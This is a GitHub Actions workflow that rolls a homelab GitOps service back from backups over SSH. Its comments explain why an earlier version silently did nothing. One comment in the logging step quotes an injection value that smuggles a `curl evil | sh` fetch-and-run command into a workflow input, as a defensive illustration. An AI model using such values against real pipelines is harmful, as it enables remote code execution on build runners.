name: Emergency Rollback

# Restores /opt/gitops on the production host from one of the timestamped
# backups that deploy.yml leaves in /opt/gitops-backups.
#
# ─────────────────────────────────────────────────────────────────────────────
# WHY THIS FILE WAS REWRITTEN WHOLESALE (ops #3282)
#
# The previous version described a deployment that does not exist. Measured on
# gitopsdashboard.mgmt.lakehouse.wtf (192.168.1.136) on 2026-08-26, with
# controls (/etc PRESENT, /nope-xyz-control absent — so the absences are real
# and not an instrument that could not run):
#
#   /opt/homelab-gitops-auditor    absent   <- it cd'd here, lines 105/166/330
#   /home/root/homelab-gitops-auditor absent <- and here, as the fallback
#   pm2 on PATH                    no       <- it stopped/started pm2 processes
#   docker / docker-compose        n/a      <- it ran docker-compose down
#   a `current/` directory         n/a      <- it tarred current/
#   a postgres db homelab_gitops   n/a      <- it ran pg_dump against it
#   /opt/gitops                    PRESENT  <- the actual install dir
#   gitops-audit-api.service       active   <- the actual service manager
#
# Two failure modes, and the second is worse than the first:
#
#  1. LOUD — every path and tool above is wrong, so the ssh block would error.
#
#  2. SILENT — every ssh step was guarded by `if: env.HAS_PRODUCTION_SSH ==
#     'true'`, computed from `secrets.PRODUCTION_SSH_KEY` and
#     `secrets.PRODUCTION_HOST`. Neither is a repo secret. `gh secret list`
#     returns exactly five names — DEPLOY_SSH_KEY, EMAIL_PASSWORD,
#     EMAIL_USERNAME, GH_REPO_PAT, GH_TOKEN_ADMIN_HOMELAB_GITOPS_AUDITOR —
#     and the org has none. So the guard was false, every step that touches
#     production was skipped, and the workflow reported SUCCESS having done
#     nothing at all. An emergency rollback whose green run means "I did not
#     run" is worse than one that fails.
#
#  3. UNREACHABLE — it also ran on `ubuntu-latest`. A GitHub-hosted runner
#     cannot resolve or reach a .mgmt.lakehouse.wtf address, so even with the
#     right secrets and paths it could never have connected. deploy.yml uses
#     `runs-on: self-hosted` for exactly this reason.
#
# This file therefore mirrors deploy.yml's `deploy-homelab` job — same runner,
# same secret, same SSH isolation, same install dir, same service — and
# inverts it. Nothing here is conditional on a secret existing: if it cannot
# do the job it fails.
#
# NOT COVERED: staging, because there is no staging. This comment previously
# said deploy-staging.yml "is NOT touched by this change — its host was never
# measured". It has since been measured, and the file is gone (ops #3282):
# no `develop` branch to trigger it, no STAGING_* secret in repo or org, no
# `staging` environment, no docker-compose.staging.yml, `runs-on:
# ubuntu-latest` which cannot reach .mgmt.lakehouse.wtf, and the same wrong
# `/opt/homelab-gitops-auditor` path. 12 runs, all failure, none since
# 2026-04-20 and not one success in its lifetime.
# ─────────────────────────────────────────────────────────────────────────────

on:
  workflow_dispatch:
    inputs:
      reason:
        description: 'Why are we rolling back? (recorded in the run log)'
        required: true
        type: string
      backup:
        description: 'Backup dir name under /opt/gitops-backups, e.g. gitops-20260825_195128. Empty = most recent.'
        required: false
        type: string

jobs:
  rollback:
    name: Roll production back
    # Must be self-hosted: the prod host is only reachable from inside the
    # homelab network.
    runs-on: self-hosted
    environment: production

    env:
      PROD_HOST: gitopsdashboard.mgmt.lakehouse.wtf
      PROD_USER: root
      # ops #2638: `ssh -i` APPENDS to the identities ssh would already offer,
      # so without IdentitiesOnly a call can succeed on a credential other than
      # the one it names. Set once here so an added call site inherits the
      # isolation rather than silently omitting it. The tilde is resolved by
      # ssh itself, so it must not be quoted at the call sites.
      SSH_OPTS: "-i ~/.ssh/deploy_key -o IdentitiesOnly=yes"

    steps:
      - name: Log the rollback request
        # `reason` and `backup` are attacker-controllable free text from
        # workflow_dispatch. They reach the shell through env, never through
        # ${{ }} interpolation into the script body — a reason of
        # `"; curl evil | sh; #` would otherwise execute on the runner.
        env:
          REASON: ${{ inputs.reason }}
          REQUESTED: ${{ inputs.backup }}
        run: |
          echo "🚨 EMERGENCY ROLLBACK"
          echo "Reason:       $REASON"
          echo "Backup:       ${REQUESTED:-(most recent)}"
          echo "Initiated by: $GITHUB_ACTOR"
          echo "Host:         $PROD_HOST"
          echo "Timestamp:    $(date -u +%Y-%m-%dT%H:%M:%SZ)"

      - name: Configure SSH
        env:
          DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
        run: |
          set -euo pipefail
          # Fail loudly rather than skipping. The old workflow's defining bug
          # was a missing secret turning into a green no-op.
          if [ -z "${DEPLOY_SSH_KEY:-}" ]; then
            echo "::error::DEPLOY_SSH_KEY is empty. Refusing to report success for a rollback that cannot run."
            exit 1
          fi
          mkdir -p ~/.ssh
          chmod 700 ~/.ssh
          printf '%s\n' "$DEPLOY_SSH_KEY" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key
          ssh-keyscan -H "$PROD_HOST" >> ~/.ssh/known_hosts 2>/dev/null || true

      - name: Resolve the backup to restore
        id: pick
        env:
          REQUESTED: ${{ inputs.backup }}
        run: |
          set -euo pipefail
          # Validate BEFORE the value reaches a command line. The remote script
          # rejects path separators too, but by then the local shell has
          # already parsed the string — a name containing a single quote would
          # break out of the quoting below. Allowlist the charset instead.
          if [ -n "${REQUESTED:-}" ] &&
             ! printf '%s' "$REQUESTED" | grep -qE '^[A-Za-z0-9._-]{1,64}$'; then
            echo "::error::Refusing backup name '$REQUESTED': expected [A-Za-z0-9._-]{1,64}"
            exit 1
          fi
          CHOSEN=$(ssh $SSH_OPTS -o StrictHostKeyChecking=accept-new \
                     "$PROD_USER@$PROD_HOST" \
                     "REQUESTED='${REQUESTED}' bash -s" <<'EOF'
          set -euo pipefail
          BACKUP_DIR=/opt/gitops-backups
          [ -d "$BACKUP_DIR" ] || { echo "MISSING_BACKUP_DIR" >&2; exit 1; }
          if [ -n "${REQUESTED:-}" ]; then
            # Reject anything that is not a plain directory name: this string
            # crosses into a path.
            case "$REQUESTED" in
              */*|*..*|"") echo "BAD_NAME" >&2; exit 1 ;;
            esac
            [ -d "$BACKUP_DIR/$REQUESTED" ] || { echo "NO_SUCH_BACKUP" >&2; exit 1; }
            printf '%s\n' "$REQUESTED"
          else
            NEWEST=$(ls -1dt "$BACKUP_DIR"/gitops-* 2>/dev/null | head -1 || true)
            [ -n "$NEWEST" ] || { echo "NO_BACKUPS" >&2; exit 1; }
            basename "$NEWEST"
          fi
          EOF
          )
          echo "Selected backup: $CHOSEN"
          echo "backup=$CHOSEN" >> "$GITHUB_OUTPUT"

      - name: Restore
        env:
          BACKUP: ${{ steps.pick.outputs.backup }}
        run: |
          set -euo pipefail
          ssh $SSH_OPTS -o StrictHostKeyChecking=accept-new \
            "$PROD_USER@$PROD_HOST" "BACKUP='${BACKUP}' bash -s" <<'EOF'
          set -euo pipefail

          INSTALL_DIR=/opt/gitops
          BACKUP_DIR=/opt/gitops-backups
          RESTORE_SRC="$BACKUP_DIR/$BACKUP"
          STAGING_DIR=/opt/gitops-rollback-new
          OLD_DIR=/opt/gitops-rollback-old

          [ -d "$RESTORE_SRC" ] || { echo "restore source vanished: $RESTORE_SRC"; exit 1; }

          # Never leave a part-written staging tree occupying the disk if we
          # abort. The swap itself is two renames on one filesystem, so it is
          # atomic and cannot half-succeed; everything risky happens before it.
          trap 'rm -rf "$STAGING_DIR"' EXIT

          echo "==> Preflight: is there room?"
          # Measured 2026-08-26 on this host: /opt/gitops is 368M, each backup
          # 358M, and / is a 7.8G loop device at 72% with 2.1G free. This job
          # writes TWO full copies (staging tree + pre-rollback snapshot)
          # before it swaps, so it can plausibly exhaust the disk — and an
          # emergency rollback that dies from ENOSPC is the worst possible
          # time to find that out. Refuse up front instead.
          NEED_KB=$(( $(du -sk "$RESTORE_SRC" | cut -f1) + $(du -sk "$INSTALL_DIR" | cut -f1) ))
          FREE_KB=$(df -Pk "$BACKUP_DIR" | awk 'NR==2{print $4}')
          MARGIN_KB=$(( NEED_KB / 10 ))          # 10% headroom
          echo "need ${NEED_KB}K + ${MARGIN_KB}K margin, free ${FREE_KB}K"
          if [ "$FREE_KB" -lt "$(( NEED_KB + MARGIN_KB ))" ]; then
            echo "ABORT: not enough free space to roll back safely."
            echo "Free space by pruning /opt/gitops-backups, then retry."
            exit 1
          fi

          echo "==> Staging a copy of $RESTORE_SRC"
          rm -rf "$STAGING_DIR"
          cp -a "$RESTORE_SRC" "$STAGING_DIR"

          echo "==> Carrying live runtime state FORWARD across the rollback"
          # Same list deploy.yml preserves. A rollback reverts CODE; it must not
          # revert accumulated data to whatever the backup happened to hold.
          for rel in audit-history api/data wiki-agent.db logs; do
            src="$INSTALL_DIR/$rel"
            dst="$STAGING_DIR/$rel"
            if [ -e "$src" ]; then
              mkdir -p "$(dirname "$dst")"
              rm -rf "$dst"
              cp -a "$src" "$dst"
              echo "preserved: $rel"
            fi
          done

          echo "==> Emergency backup of the CURRENT (bad) tree, so this is reversible"
          mkdir -p "$BACKUP_DIR"
          EMERGENCY="$BACKUP_DIR/pre-rollback-$(date +%Y%m%d_%H%M%S)"
          cp -a "$INSTALL_DIR" "$EMERGENCY"
          echo "Pre-rollback snapshot: $EMERGENCY"

          echo "==> Stopping gitops-audit-api"
          systemctl stop gitops-audit-api

          echo "==> Atomic swap"
          rm -rf "$OLD_DIR"
          mv "$INSTALL_DIR" "$OLD_DIR"
          mv "$STAGING_DIR" "$INSTALL_DIR"

          echo "==> Starting gitops-audit-api"
          systemctl start gitops-audit-api

          rm -rf "$OLD_DIR"

          # Two INDEPENDENT prunes, each over its own glob. Pruning the two
          # families together would be a latent bug: sorted by mtime the fresh
          # pre-rollback snapshot is newest and survives by luck, so a widened
          # glob looks correct on the first rollback and silently eats the
          # older undo points on the third. Keeping the globs separate makes
          # the guarantee structural rather than incidental.
          #
          # Retain 5 deploy backups (matches deploy.yml).
          ls -1dt "$BACKUP_DIR"/gitops-* 2>/dev/null | tail -n +6 | xargs -r rm -rf
          # Retain 2 undo points. At 368M each on a 7.8G disk this cannot be
          # unbounded -- three un-pruned rollbacks would fill the volume.
          ls -1dt "$BACKUP_DIR"/pre-rollback-* 2>/dev/null | tail -n +3 | xargs -r rm -rf

          trap - EXIT
          echo "==> Restore complete"
          df -Pk "$BACKUP_DIR" | awk 'NR==2{printf "free after: %dM\n", $4/1024}'
          EOF

      - name: Verify the rolled-back service actually serves
        run: |
          set -euo pipefail
          for i in $(seq 1 12); do
            if curl -fsSL --max-time 5 "http://$PROD_HOST:3070/api/v2/platform/health" > /dev/null; then
              echo "OK: /api/v2/platform/health responded on attempt $i"
              curl -s -o /dev/null -w "/audit: HTTP %{http_code}\n" --max-time 5 \
                "http://$PROD_HOST:3070/audit" || true
              exit 0
            fi
            sleep 3
          done
          echo "::error::Health check did not pass within 36s AFTER the rollback. Production may be down."
          ssh $SSH_OPTS -o StrictHostKeyChecking=accept-new "$PROD_USER@$PROD_HOST" \
            'systemctl status gitops-audit-api --no-pager || true; journalctl -u gitops-audit-api -n 40 --no-pager || true'
          exit 1

      - name: Report
        if: always()
        env:
          REASON: ${{ inputs.reason }}
          CHOSEN: ${{ steps.pick.outputs.backup }}
          STATUS: ${{ job.status }}
        run: |
          echo "Rollback of $PROD_HOST to '${CHOSEN:-<none selected>}': $STATUS"
          echo "Reason given: $REASON"
          echo "To undo, re-run with the pre-rollback-* snapshot named above."

      - name: Remove deploy key
        if: always()
        run: rm -f ~/.ssh/deploy_key
